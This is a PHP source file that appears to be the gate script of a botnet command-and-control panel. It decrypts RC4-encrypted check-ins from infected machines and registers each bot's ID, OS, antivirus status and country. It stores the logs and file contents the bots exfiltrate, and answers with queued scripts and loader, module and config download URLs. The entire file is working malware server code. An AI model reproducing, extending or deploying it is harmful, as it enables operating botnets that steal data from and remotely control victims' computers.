<?php 

$remoteAddr = isset($_GET["ip"]) ? $_GET["ip"] : $_SERVER["REMOTE_ADDR"];

if (@$_SERVER['REQUEST_METHOD'] !== 'POST') {
	WriteLog("Bad REQUEST_METHOD");
	die();
}

require_once("core/config.php");
require_once("core/global.php");

$data     = @file_get_contents("php://input");
$dataSize = @strlen($data);

if ($dataSize < HEADER_SIZE + ITEM_HEADER_SIZE) {
	WriteLog("Bad size");
	die();
}

$key = substr(CsrArrToBin(CsrRc4Init($config["botnet_crypt_key"])), 0, 16);
CsrSimpleCrypt($data, $key);
CsrRc4Crypt($data, $config["botnet_crypt_key"]);

if (strcmp(md5(substr($data, HEADER_SIZE), true), substr($data, HEADER_MD5, 16)) !== 0) {
	WriteLog("Unpack failed");
	die();
}

$list = array();
for ($i = HEADER_SIZE; $i < $dataSize; ) {
	$k = @unpack('L4', @substr($data, $i, ITEM_HEADER_SIZE));
	$item = @substr($data, $i + ITEM_HEADER_SIZE, $k[3]);
	$list[$k[1]] = $item;
	$i += (ITEM_HEADER_SIZE + $k[3]);
}

unset($data);

if(empty($list[SBCID_BOT_VERSION]) || empty($list[SBCID_BOT_ID])) die();

if(!CsrConnectToDb()) {
	WriteLog("CsrConnectToDb() failed");
	die();
}

$botId      = str_replace("\x01", "\x02", trim($list[SBCID_BOT_ID]));
$botIdQ     = addslashes($botId);
$botVersion = toUint($list[SBCID_BOT_VERSION]);
$realIpv4   = $remoteAddr;
$country    = getCountryIpv4();
$countryQ   = addslashes($country);
$curTime    = CURRENT_TIME;

if (!empty($list[SBCID_SCRIPT_ID]) && isset($list[SBCID_SCRIPT_STATUS], $list[SBCID_SCRIPT_RESULT]) && strlen($list[SBCID_SCRIPT_ID]) == 16)
{
	if(!CsrSqlQuery("INSERT INTO `scripts_stat` SET " .
									"`bot_id` = '{$botIdQ}', " .
									"`rtime` = {$curTime}, ".
									"`extern_id` = '" . addslashes($list[SBCID_SCRIPT_ID]) . "'," .
									"`type`=" . (toInt($list[SBCID_SCRIPT_STATUS]) == 0 ? 2 : 3) . "," .
									"`report`='" . addslashes($list[SBCID_SCRIPT_RESULT]) . "'")) die();
}
else if (!empty($list[SBCID_BOTLOG]) && !empty($list[SBCID_BOTLOG_TYPE]))
{
	if (!is_array($list[SBCID_BOTLOG_TYPE])) {
		$list[SBCID_BOTLOG_TYPE] = array($list[SBCID_BOTLOG_TYPE]); 
		$list[SBCID_PATH_SOURCE] = array($list[SBCID_PATH_SOURCE]); 
		$list[SBCID_BOTLOG] = array($list[SBCID_BOTLOG]); 
	}
	
	$cnt = count($list[SBCID_BOTLOG_TYPE]);
	$values = "";
	$table = 'reports_' . gmdate('ymd', $curTime);
	$query = 'INSERT INTO `' . $table . '` (`bot_id`, `type`, `rtime`, `path`, `content`) values ';
	
	for ($i = 0; $i < $cnt; ++$i) {
		$type = toInt($list[SBCID_BOTLOG_TYPE][$i]);
		$path = empty($list[SBCID_PATH_SOURCE][$i]) ? '' : addslashes($list[SBCID_PATH_SOURCE][$i]);
		$content = addslashes($list[SBCID_BOTLOG][$i]);
		$values .= '(\'' . $botIdQ . '\', ' . $type . ', ' . $curTime . ', \'' . $path . '\', \'' . $content . '\'), ';
	}
	
	$values = substr($values, 0, -2);
	$query .= $values;
	
	if (!CsrSqlQuery($query) && (!CsrSqlQuery('CREATE TABLE IF NOT EXISTS `' . $table . '` LIKE `reports`') || !CsrSqlQuery($query))) die();	
}
else if (!empty($list[SBCID_NET_LATENCY]))
{
	$isNat = strpos($list[SBCID_IPV4_ADDRESSES], pack('N', ip2long($realIpv4))) === false ? 1 : 0;
	$lastUpdate = isset($list[SBCID_LAST_UPDATE]) ? toUint($list[SBCID_LAST_UPDATE]) : 0;
	$av = isset($list[SBCID_BOT_AV]) ? toUint($list[SBCID_BOT_AV]) : 0;
	
	$loaderCrc = isset($list[SBCID_LOADER_HASH]) ? toUint($list[SBCID_LOADER_HASH]) : 0;
	$botCrc = isset($list[SBCID_BOT_HASH]) ? toUint($list[SBCID_BOT_HASH]) : 0;
	$configCrc = isset($list[SBCID_CONFIG_HASH]) ? toUint($list[SBCID_CONFIG_HASH]) : 0;
	
	$query = "`bot_id`='{$botIdQ}', `bot_version`={$botVersion}, `country`='{$countryQ}', `nat`={$isNat}, `av`={$av}, `rtime_last_update`= {$lastUpdate}, `rtime_last`={$curTime}, ".
					 "`os_version`='" . (empty($list[SBCID_OS_INFO]) ? '' : addslashes($list[SBCID_OS_INFO])) . "', ".
					 "`ipv4`=" . ip2long($realIpv4) . ", `loader_crc` = {$loaderCrc}, `bot_crc` = {$botCrc}, `config_crc` = {$configCrc}";
	
	if (!CsrSqlQuery("INSERT INTO `bots` SET `rtime_first`={$curTime}, `rtime_online`={$curTime}, {$query} " .
									 "ON DUPLICATE KEY UPDATE `rtime_last_update`={$lastUpdate}, `rtime_online`=IF(`rtime_last` <= ".($curTime - $config['bot_timeout'] * 60).", {$curTime}, `rtime_online`), {$query}")) 
	{
		die();
	}
										 
	unset($query);
  
	//Ответ
	$replyData  = '';
	$replyCount = 0;
	
	//Данные о файлах
	$data = GetUpdateData();
	if ($data) {
		$size = strlen($data);
		$replyData .= pack('LLLL', ++$replyCount, 0, $size, $size) . $data;
	} else {
		$replyData .= pack('LLLL', ++$replyCount, 0, 0, 0);
	}
	
	//Скрипты
  $botIdQm   = CsrToSqlSafeMask($botIdQ);
  $countryQm = CsrToSqlSafeMask($countryQ);

  $scripts = CsrSqlQueryRows("SELECT `id`, `extern_id`, `content`, `send_limit` FROM `scripts` WHERE `flag_enabled` = 1 ".
															"AND (`countries`='' OR `countries` LIKE BINARY \"%\x01{$countryQm}\x01%\")" .
															"AND (`bots`='' OR `bots` LIKE BINARY \"%\x01{$botIdQm}\x01%\")" .
															" LIMIT 10");
		
  foreach ($scripts as &$script)
  {
		$eid = addslashes($script["extern_id"]);
    $cnt = CsrSqlQueryRowEx("SELECT COUNT(*) FROM `scripts_stat` WHERE `type`=1 and `extern_id`='{$eid}'");
		if ($cnt === false) {
			continue;
		}
					 
		if ($cnt >= $script["send_limit"]) {
			CsrSqlQuery("UPDATE `scripts` SET `flag_enabled` = 0 WHERE `id` = {$script['id']} LIMIT 1");
	    continue;
    }
    
    if (CsrSqlQuery("INSERT HIGH_PRIORITY INTO `scripts_stat` SET `extern_id` = '{$eid}', `type` = 1, `bot_id` = '{$botIdQ}', `rtime` = {$curTime}, `report` = 'Sended'")) {
      $size = strlen($script["extern_id"]) + strlen($script["content"]);
      $replyData .= pack('LLLL', ++$replyCount, 0, $size, $size) . $script["extern_id"] . $script["content"];
    }
  }
	
	if ($replyCount > 0) {
		sendReply($replyData, $replyCount);
	}
}
else 
{
	WriteLog("Bad command.");
	die();
}

sendEmptyReply();

function GetUpdateData()
{
	$retVal = pack('L', 0) . pack('L', 0) . pack('L', 0) .  pack('c', 0) . pack('c', 0);
	$fileSize = filesize("tmp/" . $GLOBALS['config']['cache_file']);
	if ($fileSize == 12) 
	{
		$fp = @fopen("tmp/" . $GLOBALS['config']['cache_file'], "rb");
		if ($fp) 
		{
			$data = fread($fp, $fileSize);
			$retVal = $data.$GLOBALS['config']["loader_url"] . pack('c', 0) .
											$GLOBALS['config']["module_url"] . pack('c', 0) .
											$GLOBALS['config']["config_url"] . pack('c', 0) . pack('c', 0);
			fclose($fp);
		}
		
	}
	return $retVal;
}

function sendEmptyReply() 
{
  $replyData = pack('LLLLLLLL', mt_rand(), mt_rand(), mt_rand(), mt_rand(), mt_rand(), HEADER_SIZE + ITEM_HEADER_SIZE, 0, 1) . "\x4A\xE7\x13\x36\xE4\x4B\xF9\xBF\x79\xD2\x75\x2E\x23\x48\x18\xA5\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
  
	CsrRc4Crypt($replyData, $GLOBALS['config']['botnet_crypt_key']);
	$key = substr(CsrArrToBin(CsrRc4Init($GLOBALS['config']['botnet_crypt_key'])), 0, 16);
	CsrSimpleCrypt($replyData, $key);
	die($replyData);
}

function sendReply($replyData, $replyCount) 
{
	$replyData = pack('LLLLLLLL', mt_rand(), mt_rand(), mt_rand(), mt_rand(), mt_rand(), HEADER_SIZE + strlen($replyData), 0, $replyCount) . md5($replyData, true) . $replyData;
	
	CsrRc4Crypt($replyData, $GLOBALS['config']['botnet_crypt_key']);
	$key = substr(CsrArrToBin(CsrRc4Init($GLOBALS['config']['botnet_crypt_key'])), 0, 16);
	CsrSimpleCrypt($replyData, $key);
	
	die($replyData);
}

function getCountryIpv4() {
	$ip = sprintf('%u', ip2long($GLOBALS['realIpv4']));
	$c = CsrSqlQueryRowEx("SELECT `c` FROM `geo` WHERE `l`<='".$ip."' AND `h`>='".$ip."' LIMIT 1");
	if (!$c) $c = "--";
	return $c;
}

function toUint($str) {
  $q = @unpack('L', $str);
  return is_array($q) && is_numeric($q[1]) ? ($q[1] < 0 ? sprintf('%u', $q[1]) : $q[1]) : 0;
}

function toInt($str) {
  $q = @unpack('l', $str);
  return is_array($q) && is_numeric($q[1]) ? $q[1] : 0;
}

function toUshort($str) {
  $q = @unpack('S', $str);
  return is_array($q) && is_numeric($q[1]) ? $q[1] : 0;
}

function isHackNameForPath($name) {
  $len = strlen($name);
  return ($len > 0 && substr_count($name, '.') < $len && strpos($name, '/') === false && strpos($name, "\\") === false && strpos($name, "\x00") === false) ? false : true;
}

function WriteLog($s) {
	/*
	global $remoteAddr;
	$logFp = fopen("log.txt", "a+");
	fwrite($logFp, $remoteAddr . ": " . $s . ".\r\n");
	fclose($logFp);
	*/
}

?>